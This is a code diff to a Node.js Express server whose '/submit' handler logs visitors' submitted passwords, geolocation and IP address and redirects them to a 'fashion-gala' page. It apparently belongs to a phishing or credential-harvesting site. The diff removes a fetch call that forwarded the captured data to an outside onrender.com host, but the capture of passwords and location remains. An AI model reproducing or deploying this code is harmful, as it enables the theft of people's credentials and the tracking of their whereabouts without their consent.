@@ -2,7 +2,6 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
 const fs = require('fs');
-const fetch = require('node-fetch');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -34,12 +33,6 @@ app.post('/submit', async (req, res) => {
     console.log("🔑 Passwort:", password);
     console.log("📍 Standort:", latitude, longitude);
     console.log("📍 IP:", clientIp);
-
-    await fetch('https://loropiana-p9gb.onrender.com/submit', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(logData)
-    });
 
     res.redirect('/fashion-gala.html');
 
